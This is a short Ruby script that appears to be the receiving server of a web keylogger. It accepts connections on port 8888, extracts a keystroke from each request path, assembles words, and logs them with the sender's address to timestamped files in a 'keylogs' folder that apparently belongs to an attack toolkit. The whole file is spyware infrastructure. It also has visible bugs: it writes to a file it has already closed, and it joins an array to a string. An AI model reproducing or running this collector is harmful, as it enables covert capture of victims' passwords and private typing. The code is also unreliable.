require 'socket'
@t = Time.now
@keys = File.open(Dir.pwd+"/modules/keylogs/log-#{@t.strftime("%H%M%d%m%y")}", 'a')
server = TCPServer.new 8888
@word = ''
def translate(log)
	letter = log.split('/', 2).last.split(' ', 2).first
	dict = {
		'%C2%BE' => '.',
	}
	dict.each{|k, v| letter = letter.gsub(k, v)}
	if letter.size == 1 and letter != '-space-'
		@word << letter
		return letter
	else
		@keys.puts @client_ip+" => "+@word
		@keys.close
		word = @word
		@word = ''
		return word
	end
	return letter
end
  @i = 0
loop do
  Thread.start(server.accept) do |client|
    @client_ip = client.peeraddr
    log = client.gets
    if @i == 0
		out = translate(log)
		puts out
		@i+=1
    else
		@i = 0
	end
    client.close
  end
end
